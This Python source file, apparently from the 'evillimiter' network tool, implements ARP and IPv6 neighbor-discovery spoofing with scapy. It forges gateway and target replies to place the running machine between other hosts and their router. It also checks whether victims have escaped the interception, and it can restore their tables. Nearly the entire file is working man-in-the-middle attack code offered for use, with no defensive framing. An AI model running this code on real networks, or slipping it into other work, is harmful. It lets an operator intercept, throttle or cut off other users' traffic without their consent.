import time
import threading
import netifaces
import warnings
from scapy.all import Ether, ARP, sendp, sr1
from scapy.all import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str) -> None:
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self._own_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']

        self.interval: int = 2

        self._hosts: set[Host] = set()
        self._hosts_lock = threading.Lock()
        self._running = False

    def add(self, host: Host) -> None:
        with self._hosts_lock:
            self._hosts.add(host)

        host.spoofed = True

    def remove(self, host: Host, restore: bool = True) -> None:
        with self._hosts_lock:
            self._hosts.discard(host)

        if restore:
            self._restore(host)

        host.spoofed = False

    def start(self) -> None:
        thread = threading.Thread(target=self._spoof, daemon=True)
        self._running = True
        thread.start()

    def stop(self) -> None:
        self._running = False

    def _spoof(self) -> None:
        iteration = 0
        while self._running:
            self._hosts_lock.acquire()
            hosts = self._hosts.copy()
            self._hosts_lock.release()

            for host in hosts:
                if not self._running:
                    return

                try:
                    self._send_spoofed_packets(host)
                except Exception:
                    pass

            iteration += 1
            if iteration % 10 == 0:
                try:
                    checker = BypassChecker(self.interface, self.gateway_ip, self.gateway_mac, self._own_mac)
                    results = checker.check_all(list(hosts))
                    for host in hosts:
                        status = results.get(host.mac, 0)
                        if status > 0:
                            host.bypass_suspicion = status
                except Exception:
                    pass

            time.sleep(self.interval)

    def _send_spoofed_packets(self, host: Host) -> None:
        pkt_to_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(op=2, hwsrc=self._own_mac, psrc=host.ip,
                  hwdst=self.gateway_mac, pdst=self.gateway_ip)
        )
        pkt_to_target = (
            Ether(dst=host.mac)
            / ARP(op=2, hwsrc=self._own_mac, psrc=self.gateway_ip,
                  hwdst=host.mac, pdst=host.ip)
        )

        sendp(pkt_to_gateway, verbose=0, iface=self.interface)
        sendp(pkt_to_target, verbose=0, iface=self.interface)

    def _restore(self, host: Host) -> None:
        pkt_to_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(op=2, hwsrc=host.mac, psrc=host.ip,
                  hwdst=BROADCAST, pdst=self.gateway_ip)
        )
        pkt_to_target = (
            Ether(dst=host.mac)
            / ARP(op=2, hwsrc=self.gateway_mac, psrc=self.gateway_ip,
                  hwdst=BROADCAST, pdst=host.ip)
        )

        sendp(pkt_to_gateway, verbose=0, iface=self.interface, count=3)
        sendp(pkt_to_target, verbose=0, iface=self.interface, count=3)


class NDPSpoofer:
    def __init__(self, interface: str, gateway_mac: str, gateway_ipv6: str | None = None) -> None:
        self.interface = interface
        self.gateway_ipv6 = gateway_ipv6
        self._own_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']

        self.interval: int = 2

        self._hosts: set[Host] = set()
        self._hosts_lock = threading.Lock()
        self._running = False

    def add(self, host: Host) -> None:
        with self._hosts_lock:
            self._hosts.add(host)

    def remove(self, host: Host) -> None:
        with self._hosts_lock:
            self._hosts.discard(host)

    def start(self) -> None:
        thread = threading.Thread(target=self._spoof, daemon=True)
        self._running = True
        thread.start()

    def stop(self) -> None:
        self._running = False

    def _spoof(self) -> None:
        while self._running:
            self._hosts_lock.acquire()
            hosts = self._hosts.copy()
            self._hosts_lock.release()

            for host in hosts:
                if not self._running:
                    return
                try:
                    for ipv6_addr in host.ipv6:
                        if ipv6_addr.startswith('fe80'):
                            continue
                        self._send_spoofed_na(host, ipv6_addr)
                except Exception:
                    pass

            time.sleep(self.interval)

    def _send_spoofed_na(self, host: Host, target_ipv6: str) -> None:
        pkt = (
            Ether(dst=host.mac)
            / IPv6(dst=target_ipv6)
            / ICMPv6ND_NA(tgt=self.gateway_ipv6 or 'ff02::1', R=0, S=1, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=self._own_mac)
        )
        sendp(pkt, verbose=0, iface=self.interface)


class BypassChecker:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str, own_mac: str) -> None:
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.own_mac = own_mac

    def check_host(self, host: Host) -> int:
        with warnings.catch_warnings():
            warnings.filterwarnings('ignore')
            gw_pkt = ARP(op=1, pdst=self.gateway_ip)
            gw_ans = sr1(gw_pkt, timeout=2, verbose=0, iface=self.interface)
            if gw_ans is not None and gw_ans.hwsrc != self.own_mac:
                return 2

            host_pkt = ARP(op=1, pdst=host.ip)
            host_ans = sr1(host_pkt, timeout=2, verbose=0, iface=self.interface)
            if host_ans is not None and host_ans.hwsrc != host.mac:
                return 1

        return 0

    def check_all(self, hosts: list[Host]) -> dict[str, int]:
        results = {}
        for host in hosts:
            results[host.mac] = self.check_host(host)
        return results
